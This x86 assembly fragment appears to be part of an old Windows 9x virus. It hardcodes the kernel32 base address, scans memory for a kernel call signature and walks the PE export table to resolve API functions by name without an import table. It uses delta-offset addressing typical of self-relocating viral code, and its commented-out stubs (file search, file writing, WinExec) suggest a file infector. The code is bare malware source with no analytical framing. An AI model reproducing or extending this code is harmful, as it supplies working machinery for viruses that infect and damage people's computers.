
kernel                  equ     0BFF70000H

exit_to_mustdie:        push    -1
                        call    _ExitProcess

exit_to_program:        ret

; --------------------- error handlers --------------------------------------

nokerneldll:
nokernelfunc:
nofunction:             jmp     $

; --------------------- kernel analizer -------------------------------------

analizekernel:          mov     esi, kernel
@@1:                    cmp     esi, kernel + 040000h
                        ja      nokernelfunc
                        lea     edi, kernel_sign[ebp]
                        mov     ecx, kernel_sign_size
                        cld
                        rep     cmpsb
                        jne     @@1

kernelfound:            sub     esi, kernel_sign_size
                        mov     kernel_call[ebp], esi

                        mov     esi, kernel
                        lodsw
                        cmp     ax, 'ZM'
                        jne     nokerneldll

                        add     esi, 003Ch-2
                        lodsd

                        lea     esi, [esi + eax - 3ch - 4]
                        lodsd
                        cmp     eax, 'EP'
                        jne     nokerneldll

                        add     esi, 78h-4      ; esi=.edata

                        lodsd
                        add     eax, kernel + 10h
                        xchg    esi, eax

                        lodsd
                        lodsd
                        lodsd
                        mov     funcnum[ebp], eax


                        lodsd
                        add     eax, kernel
                        mov     entrypointptr[ebp], eax

                        lodsd
                        add     eax, kernel
                        mov     nameptr[ebp], eax

                        lodsd
                        add     eax, kernel
                        mov     ordinalptr[ebp], eax

                        lea     edx, names[ebp]
                        lea     edi, fns[ebp]

@@1:                    push    edi
                        call    findfunction
                        pop     edi

                        stosd

                        mov     edx, esi

                        cmp     byte ptr [esi], 0
                        jne     @@1

                        ret

findfunction:           mov     ecx, funcnum[ebp]
                        xor     ebx, ebx

findnextfunc:           mov     esi, edx

                        mov     edi, ebx
                        add     edi, nameptr[ebp]
                        mov     edi, [edi]

                        add     edi, kernel

@@2:                    cmpsb
                        jne     @@1

                        cmp     byte ptr [esi-1], 0
                        jne     @@2

                        ; found

                        shr     ebx, 1

                        mov     eax, ebx
                        add     eax, ordinalptr[ebp]
                        movzx   eax, word ptr [eax]

                        shl     eax, 2
                        add     eax, entrypointptr[ebp]
                        mov     eax, [eax]
                        add     eax, kernel

                        ret

@@1:                    add     ebx, 4
                        loop    findnextfunc

                        jmp     nofunction

; ===================== functions ===========================================

func                    macro   name
_&name&:                push    fn_&name&[ebp]
                        jmp     kernel_call[ebp]
                        endm

                        func    ExitProcess
                        ;func    FindFirstFileA
                        ;func    FindNextFileA
                        ;func    CreateFileA
                        ;func    SetFilePointer
                        ;func    ReadFile
                        ;func    WriteFile
                        ;func    CloseHandle
                        ;func    GetCurrentDirectoryA
                        ;func    SetCurrentDirectoryA
                        ;func    GetWindowsDirectoryA
                        ;func    GetCommandLineA
                        ;func    WinExec
                        ;func    SetPriorityClass
                        ;func    GetModuleHandleA
                        ;func    GetLastError
                        func    LoadLibraryA
                        func    GetProcAddress

